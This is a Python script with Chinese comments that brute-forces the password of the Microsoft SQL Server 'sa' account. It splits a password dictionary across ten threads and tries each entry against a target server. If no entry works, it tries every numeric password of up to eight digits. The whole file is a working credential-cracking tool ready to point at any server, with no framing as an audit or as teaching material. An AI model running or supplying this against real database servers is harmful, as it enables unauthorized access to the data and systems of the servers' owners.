#!/usr/bin/evn python
#-*- coding:utf-8 -*-
'''
Created on 2018年11月19日

@author: jinfeng
'''


from threading import Thread
import time
import os
import pymssql


def cracker(server,pswd_list,no):
    global tag
    
    print(u"No.%s号线程已开始运行，对%d个常用密码进行测试 !" % (no,len(pswd_list)))
    for pswd in pswd_list:
        if not tag:
            try:
                conn=pymssql.connect(server,'sa',str(pswd),database='master')
                print(u"No.%s号线程运行结束 !\n 服务器%s 账号sa的密码为 ：  %s\n" % (no,server,pswd))
                tag = True
                conn.close()
                break
            except:
                continue
        else:
            break
    
    #print(u"No.%s号线程运行结束 !" % no)
        
    
def get_pwlist():
    pwlist = []
    with open('passwddic.txt','r') as f:
        for line in f.readlines():
            password = line.strip('\n')
            pwlist.append(password)
    return pwlist

def main():
    global tag
    tag = False
    server = '127.0.0.1'
    num_thread = 10
    time_start = time.time()
    pwlist = get_pwlist()
    step = len(pwlist)//num_thread+1
    for n in range(num_thread):
        t1 = Thread(target = cracker,args = (server,pwlist[step*n:step*n+step],str(n+1),))
        t1.start()
    t1.join()
    
    if not tag:
        print(u'密码字典测试完毕，未找到匹配密码，将遍历测试8位以内所有数字密码！')
        for m in range(10):
            t2 = Thread(target = cracker,args = (server,range(m*10000000,(m+1)*10000000),str(m+1)+'+',))
            t2.start()
        t2.join()
    time_end = time.time()
    time_use = time_end - time_start
    print(u'用时 %d时%d分%d秒' % (time_use//3600,time_use%3600//60,time_use%60))
    
    
if __name__ == "__main__":
    main()